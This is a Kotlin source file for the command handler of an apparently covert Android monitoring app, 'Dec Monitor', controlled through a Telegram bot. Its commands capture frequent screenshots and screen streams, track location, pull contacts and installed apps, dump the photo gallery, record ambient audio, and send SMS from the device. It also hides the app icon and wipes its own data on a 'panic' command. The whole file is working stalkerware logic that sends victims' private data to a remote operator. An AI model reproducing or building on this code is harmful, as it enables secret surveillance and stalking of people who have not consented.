package com.dec.monitor

import android.content.Context
import android.content.Intent
import com.dec.monitor.location.LocationTracker
import com.dec.monitor.media.AmbientRecorder
import com.dec.monitor.media.GalleryDumper
import com.dec.monitor.screen.LiveStreamService
import com.dec.monitor.screen.ScreenshotService
import com.dec.monitor.stealth.StealthManager
import com.dec.monitor.system.DeviceInfo
import com.dec.monitor.usage.AppUsageTracker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object CommandHandler {

    fun handle(context: Context, command: String) {
        CoroutineScope(Dispatchers.IO).launch {
            when {
                command == "/screenshot_on" -> {
                    ScreenshotService.fastMode = true
                    TelegramBot.sendMessage("📸 Screenshot ON — every 3s ⚡")
                }
                command == "/screenshot_off" -> {
                    ScreenshotService.fastMode = false
                    TelegramBot.sendMessage("📸 Screenshot OFF — back to 30s")
                }
                command == "/stream_on" -> {
                    LiveStreamService.streamIntervalMs = 10_000L
                    TelegramBot.sendMessage("🔴 Live stream ON — every 10s\n⚠️ Needs MediaProjection grant on reboot")
                }
                command == "/stream_off" -> {
                    LiveStreamService.isStreaming = false
                    TelegramBot.sendMessage("⏹ Live stream OFF")
                }
                command == "/location" -> {
                    TelegramBot.sendMessage("📍 Fetching location...")
                    DeviceInfo.getLocation(context)
                }
                command == "/location_on" -> {
                    LocationTracker.startTracking(context)
                }
                command == "/location_off" -> {
                    LocationTracker.stopTracking()
                    TelegramBot.sendMessage("📍 Location tracking stopped")
                }
                command == "/location_history" -> {
                    TelegramBot.sendMessage("📍 <b>Today's Route</b>\n${LocationTracker.getDayHistory()}")
                }
                command == "/battery" -> {
                    val info = DeviceInfo.getBatteryInfo(context)
                    TelegramBot.sendMessage("🔋 <b>Battery</b>\n$info")
                }
                command == "/contacts" -> {
                    TelegramBot.sendMessage("📒 Fetching contacts...")
                    DeviceInfo.getContacts(context)
                }
                command == "/apps" -> {
                    val apps = DeviceInfo.getInstalledApps(context)
                    TelegramBot.sendMessage("📱 <b>Installed Apps</b>\n$apps")
                }
                command == "/usage" -> {
                    TelegramBot.sendMessage("📊 Generating usage report...")
                    AppUsageTracker.getDailyReport(context)
                }
                command == "/ring" -> {
                    DeviceInfo.ringDevice(context)
                    TelegramBot.sendMessage("🔔 Ringing device...")
                }
                command == "/gallery5" -> {
                    GalleryDumper.sendLatest(context, 5)
                }
                command == "/gallery20" -> {
                    GalleryDumper.sendLatest(context, 20)
                }
                command == "/galleryhalf" -> {
                    GalleryDumper.sendLatest(context, -2)
                }
                command == "/galleryfull" -> {
                    TelegramBot.sendMessage("⚠️ Sending FULL gallery...")
                    GalleryDumper.sendLatest(context, -1)
                }
                command == "/mic" -> {
                    TelegramBot.sendMessage("🎙 Recording 30s...")
                    AmbientRecorder.record(context, 30)
                }
                command == "/mic60" -> {
                    TelegramBot.sendMessage("🎙 Recording 60s...")
                    AmbientRecorder.record(context, 60)
                }
                command.startsWith("/sms ") -> {
                    val parts = command.removePrefix("/sms ").split(" ", limit = 2)
                    if (parts.size == 2) {
                        DeviceInfo.sendSms(context, parts[0], parts[1])
                        TelegramBot.sendMessage("✅ SMS sent to ${parts[0]}")
                    } else {
                        TelegramBot.sendMessage("❌ Usage: /sms <number> <message>")
                    }
                }
                command == "/panic" -> {
                    TelegramBot.sendMessage("🚨 PANIC — clearing all data...")
                    StealthManager.showIcon(context)
                    // clear cache
                    context.cacheDir.deleteRecursively()
                    context.getExternalFilesDir(null)?.deleteRecursively()
                    TelegramBot.sendMessage("✅ Data cleared. Uninstall manually.")
                }
                command == "/hide" -> {
                    StealthManager.hideIcon(context)
                    TelegramBot.sendMessage("👁 Icon hidden")
                }
                command == "/show" -> {
                    StealthManager.showIcon(context)
                    TelegramBot.sendMessage("👁 Icon visible")
                }
                command == "/help" -> {
                    TelegramBot.sendMessage(
                        """
🤖 <b>Dec Monitor Commands</b>

📸 Screenshot:
/screenshot_on — every 3s fast mode ⚡
/screenshot_off — back to 30s

🔴 Live Stream:
/stream_on — screen every 10s
/stream_off — stop stream

📍 Location:
/location — get now
/location_on — auto track (5min)
/location_off — stop tracking
/location_history — today's route

🔋 /battery
📒 /contacts
📱 /apps
📊 /usage — app usage report
🔔 /ring

🖼 Gallery:
/gallery5 /gallery20
/galleryhalf /galleryfull

🎙 Mic:
/mic — 30s
/mic60 — 60s

💬 /sms &lt;number&gt; &lt;message&gt;

👁 Stealth:
/hide — hide icon
/show — show icon
/panic — wipe all data

❓ /help
                        """.trimIndent()
                    )
                }
                else -> TelegramBot.sendMessage("❓ Unknown. Send /help")
            }
        }
    }
}
